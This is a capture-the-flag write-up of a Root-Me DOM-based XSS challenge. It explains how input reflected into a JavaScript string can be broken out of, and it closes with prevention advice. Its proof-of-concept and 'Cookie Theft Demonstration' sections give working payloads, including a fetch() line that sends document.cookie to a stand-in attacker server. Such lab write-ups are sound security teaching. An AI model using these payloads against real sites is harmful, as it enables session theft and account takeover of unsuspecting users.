# XSS DOM-Based - Introduction
[Root-Me Challenge Proof](https://www.root-me.org/?page=validation&id_challenge=2914&id_auteur=1089475&lang=en)

This lab demonstrates a **DOM-Based Cross-Site Scripting (XSS)** vulnerability.

Unlike reflected or stored XSS, the payload is processed entirely by client-side JavaScript. The server simply reflects user input into a JavaScript variable, and the browser executes the resulting script.

---

# Finding the Injection Point

The vulnerable parameter was:

```text
http://challenge01.root-me.org/web-client/ch32/index.php?number=nnn
```
<img width="1868" height="579" alt="image" src="https://github.com/user-attachments/assets/6870f972-7d17-43eb-be1e-700b1ebfe617" />
The value of `number` was reflected inside a JavaScript block:

```javascript
var random = Math.random() * (99);
var number = 'nnn';

if(random == number) {
    document.getElementById('state').style.color = 'green';
    document.getElementById('state').innerHTML =
        'You won this game but you don\'t have the flag ;)';
}
else{
    document.getElementById('state').style.color = 'red';
    document.getElementById('state').innerText =
        'Sorry, wrong answer ! The right answer was ' + random;
}
```

---

# Why It Is Vulnerable

User input is placed directly inside a JavaScript string:

```javascript
var number = 'USER_INPUT';
```

No escaping or sanitization is performed.

This means an attacker can:

1. Close the existing string
2. Inject arbitrary JavaScript
3. Comment out the remaining code

---

# Proof of Concept

Payload:

```text
1';alert(1)//
```

URL:

```text
http://challenge01.root-me.org/web-client/ch32/index.php?number=1';alert(1)//
```

Resulting JavaScript:

```javascript
var number = '1';
alert(1);
//';
```

### What Happens?

1. `'1'` closes the original string.
2. `alert(1)` executes attacker-controlled JavaScript.
3. `//` comments out the remaining quote to prevent syntax errors.

The alert box confirms successful JavaScript execution.

---

# Cookie Theft Demonstration

After confirming code execution, tested data exfiltration using an external listener.

Payload:

```javascript
';fetch('https://attacker-server/?c=' + document.cookie)//
```

URL-encoded version:

```text
http://challenge01.root-me.org/web-client/ch32/?number=%27%3Bfetch(%27https%3A%2F%2Fattacker-server%2F%3Fc%3D%27%20%2B%20document.cookie)%2F%2F
```

---

# How It Works

Injected code becomes:

```javascript
var number = '';
fetch('https://attacker-server/?c=' + document.cookie);
//';
```

Execution flow:

1. Browser executes injected JavaScript.
2. `document.cookie` reads accessible cookies.
3. `fetch()` sends an HTTP request to the attacker-controlled server.
4. Cookie values are included in the request.

Example request:

```text
GET /?c=session=abc123
```
<img width="1252" height="500" alt="image" src="https://github.com/user-attachments/assets/0e65828e-a085-45ef-b966-d4bab8d0c55f" />
The attacker receives the victim's cookie value.

---

# Why This Is DOM-Based XSS

The vulnerability exists inside browser-side JavaScript logic.

Characteristics:

- User input reaches a DOM sink
- JavaScript processes the data
- Execution happens in the browser
- No server-side payload storage required

Data flow:

```text
URL Parameter
      ↓
JavaScript Variable
      ↓
Browser Executes Code
      ↓
DOM-Based XSS
```

---

# Impact

Successful exploitation may allow:

- Session hijacking
- Account takeover
- Sensitive data theft
- Actions performed as the victim
- Phishing and content manipulation

The actual impact depends on:

- Cookie protections
- CSP implementation
- User privileges
- Application functionality

---

# Key Learnings

- Reflection inside JavaScript contexts is highly dangerous.
- Breaking out of strings is a common XSS technique.
- `//` comments help avoid syntax errors after injection.
- DOM-Based XSS occurs entirely in the browser.
- Any user-controlled data inserted into JavaScript without proper encoding can lead to code execution.

---

# Prevention

- Never insert user input directly into JavaScript code.
- Apply context-aware output encoding.
- Use safe DOM APIs such as:

```javascript
textContent
innerText
```

instead of dangerous sinks like:

```javascript
innerHTML
eval()
document.write()
```

- Implement a strong Content Security Policy (CSP).
- Validate and sanitize all user-controlled input.
